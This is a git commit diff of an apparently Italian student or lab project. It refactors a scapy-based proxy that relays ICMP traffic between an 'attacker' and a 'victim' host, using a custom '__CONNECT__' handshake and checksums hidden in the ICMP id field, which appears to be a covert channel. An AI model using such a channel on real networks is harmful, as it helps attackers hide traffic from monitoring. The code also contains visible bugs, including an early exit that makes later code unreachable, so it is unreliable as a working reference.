ea4f0871c013a5990b94660d169879bd38d1d82a
Marco <61580913+mcrmrc@users.noreply.github.com.>
2025-06-03 16:35:51 +0200

    Modificato file proxy.py

--- implementazione/unione/proxy.py
+++ implementazione/unione/proxy.py
@@ -3,14 +3,11 @@ import threading
 import argparse 
 import mymethods
 import time
+import re
+import comunication_methods as com
 
-parser = argparse.ArgumentParser()
-parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
-#parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
-
-event = threading.Event()
-ip_attaccante=None
-ip_vittima=None
+event = threading.Event() 
+pkt_conn_arrived = threading.Event() 
 
 def callback_redirect(packet):
     if packet[IP].src is not ip_attaccante:
@@ -25,7 +22,7 @@ def callback_redirect(packet):
         payload=payload.replace("__END__","").strip()
         if payload=="":
             print("Fine connessione")
-            event.set()
+            com.pkt_conn_arrived.set()
             return 
     if not packet[ICMP].id==mymethods.calc_checksum(payload):
         print("Il payload non combacia con il checksum")
@@ -48,18 +45,9 @@ def parte_redirect_packet():
         # #,iface=args.host_iface 
     ) 
     sniffer.start()
-    event.wait()
+    com.pkt_conn_arrived.wait()
     sniffer.stop()
     sniffer.join() 
-
-packet_received_event = threading.Event()
-
-def sniffer_timeout():
-    global sniffer
-    if not packet_received_event.is_set():
-        print("Timeout: No packet received within 60 seconds")
-        sniffer.stop() 
-        event.set()
 
 def callback_vittima(packet):
     print("callback_vittima")
@@ -67,8 +55,7 @@ def callback_vittima(packet):
     print("Packet received: {}".format(packet.summary())) 
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
         payload = mymethods.calc_checksum(bytes(packet[Raw].load))
-        check_sum=mymethods.calc_checksum(b"__CONNECT__ ") 
-        print( check_sum)
+        check_sum=mymethods.calc_checksum(b"__CONNECT__ ")  
         if packet[ICMP].type!=8 and packet[ICMP].type!=0:
             print(f"Il messaggio non è una Request o Reply: {packet[ICMP].type}")
             return
@@ -76,47 +63,32 @@ def callback_vittima(packet):
         if check_sum==payload and ip_vittima==packet[IP].src and packet[ICMP].id==check_sum:
             print("Payload: {}".format(payload)) 
             print("Vittima IPs: {}".format(ip_vittima))
-            packet_received_event.set()
+            com.pkt_received_event.set()
             timeout_timer.cancel() 
-            event.set()
+            com.pkt_conn_arrived.set()
         else: 
             print(f"Il paccheto proviene da {packet[IP].src} ma non è valido")
             return
             raise Exception(f"Il paccheto proviene da {packet[IP].src} ma non è valido")    
 
 def connessione_vittima():
-    print("connessione_vittima")
-    global ip_vittima, timeout_timer, sniffer
-    if ip_vittima is None or ip_vittima=="":
-        raise Exception("IP vittima non specificato")
-    payload="__CONNECT__ "
-    print(payload)
-    print(ip_vittima)
-    id_icmp=mymethods.calc_checksum(payload.encode()) 
-    pkt = IP(dst=ip_vittima)/ICMP(id=id_icmp) / payload
-    ans = sr1(pkt, timeout=2, verbose=1)
-    if ans:
-        print(f"{ip_vittima} is alive")
-        #ans.show() 
-        sniffer= AsyncSniffer(
-            filter=f"icmp and src {ip_vittima}" 
-            #,count=1 
-            ,prn=callback_vittima 
-            #,store=True 
-            ,iface=mymethods.iface_from_IP(ip_vittima)[1]
-        )
-        timeout_timer = threading.Timer(20, sniffer_timeout)
-        sniffer.start() 
-        timeout_timer.start()
-        event.wait()
-        print(f"sinffer is runing: {sniffer.running}")
-        if not sniffer.running:
-            return False
-        sniffer.stop()
-        sniffer.join() 
-        return True
-    print(f"No reply: {ip_vittima} is not responding") 
-    return False
+    data="__CONNECT__ "
+    if com.send_packet(data, ip_vittima):
+        args={
+            "filter":f"icmp and src {ip_vittima}" 
+            #,"count":1 
+            ,"prn":callback_vittima 
+            #,"store":True 
+            ,"iface":mymethods.iface_from_IP(ip_vittima)[1]
+        }
+        com.sniff_packet(args)
+        pkt_conn_arrived.wait()
+        if com.sniffer.running:
+            com.sniffer.stop()
+            com.sniffer.join()
+            return True
+    print(f"{ip_vittima} is not responding: No Reply")
+    return False 
 
 def callback_attaccante(packet):
     global ip_vittima
@@ -129,54 +101,83 @@ def callback_attaccante(packet):
             print("Attacker IP: {}".format(ip_attaccante))
             #print("Payload: {}".format(payload)) 
             print("Vittima IPs: {}".format(ip_vittima))
-            event.set()
+            com.pkt_conn_arrived.set()
         else:
             print(f"Il paccheto proviene da {packet[IP].src} ma non richiede la connessione alla macchina")
 
-def connessione_attaccante():
-    print(f"Controllo connessione per {ip_attaccante} attraverso {mymethods.iface_from_IP(ip_attaccante)[1]}")
-    sniffer= AsyncSniffer(
-            filter=f"icmp and src {ip_attaccante}" 
-            #,count=1 
-            ,prn=callback_attaccante 
-            #,store=True 
-            ,iface=mymethods.iface_from_IP(ip_attaccante)[1]
-    )  
-    sniffer.start() 
-    event.wait() 
-    sniffer.stop()
-    sniffer.join()
-    #print(f"Vittima {ip_vittima}")
-    if ip_vittima=="" or ip_vittima is None: 
-        raise Exception("IP della vittima non presente nel messaggio")
-    #time.sleep(20)
-    pkt = IP(dst=ip_attaccante)/ICMP() / b"__CONNECT__ "
-    ans = sr1(pkt, timeout=2, verbose=1)
-    if ans:
-        print(f"{ip_attaccante} is alive")
-        #ans.show()
-        return True
-    else:
-        print(f"No reply: {ip_attaccante} is not responding")
+def get_args_parser():
+    global parser
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--ip_host",type=str, help="IP dell'attaccante")
+    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
+    parser.add_argument("--ip_vittima",type=str, help="IP vittima")
+    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
+    return mymethods.check_args(parser) 
+
+def check_parser(args):
+    if type(args) is not argparse.Namespace or args is None:
+        print("Nessun argomento passato") 
         return False
+    if args.ip_attaccante is None or type(args.ip_attaccante) is not str or re.match(com.ip_reg_pattern, args.ip_attaccante) is None:
+        print("IP attaccante non valido o non specificato")
+        mymethods.supported_arguments(parser)
+        return False   
+    if args.ip_vittima is None or type(args.ip_vittima) is not str or re.match(com.ip_reg_pattern, args.ip_vittima) is None:
+        print("IP vittima non valido o non specificato")
+        mymethods.supported_arguments(parser)
+        return False
+    return True
+
+def get_value_parser(args):
+    if args is None: 
+        raise Exception("Nessun argomento passato")
+    global ip_attaccante, gateway_attaccante
+    global ip_vittima, gateway_vititma
+
+    ip_attaccante=args.ip_attaccante 
+    gateway_attaccante=".".join(
+        ip_attaccante.split(".")[index] if index!=3 else "0" 
+        for index in range(len(ip_attaccante.split(".")))
+    )
+
+    ip_vittima=args.ip_vittima 
+    gateway_vititma=".".join(
+        ip_vittima.split(".")[index] if index!=3 else "0" 
+        for index in range(len(ip_vittima.split(".")))
+    ) 
 
 if __name__ == "__main__": 
-    global sniffer
-    ip_vittima="192.168.56.1" 
     print("Main function") 
-    args=mymethods.check_args(parser) 
-    if args.ip_attaccante is None :
-        print("Devi specificare l'IP dell'attaccante")
-        mymethods.supported_arguments(parser)
-        exit(0) 
-    
-    ip_attaccante=args.ip_attaccante 
-    try:
-        exit(0) if not connessione_attaccante() else None 
+    args=get_args_parser() 
+    if not check_parser(args):
         exit(0)
-        exit(0) if not connessione_vittima() else None
+    get_value_parser(args) 
+    print(f"IP attaccante:\t{ip_attaccante}")
+    print(f"Gateway attaccante:\t{gateway_attaccante}") 
+    print(f"IP vittima:\t{ip_vittima}")
+    print(f"Gateway vittima:\t{gateway_vititma}") 
+
+    try:
+        print(f"Controllo connessione per {ip_attaccante} attraverso {mymethods.iface_from_IP(ip_attaccante)[1]}")
+        args={
+            "filter":f"icmp and src {ip_attaccante}" 
+            #,"count":1 
+            ,"prn":callback_attaccante 
+            #,"store":True 
+            ,"iface":mymethods.iface_from_IP(ip_attaccante)[1]
+        } 
+        if not com.check_connessione(ip_attaccante,args): 
+            print("Connessione con l'attaccante: NON DISPONIBILE")
+            exit(0)
     except Exception as e:
-        print(f"Eccezione: {e}")
+        print(f"Eccezzione: {e}")
+        exit(1)
+    exit(0)
+    try: 
+        if not connessione_vittima():
+            exit(0) 
+    except Exception as e:
+        print(f"Eccezzione: {e}")
         exit(1)
     exit(0)
     try:
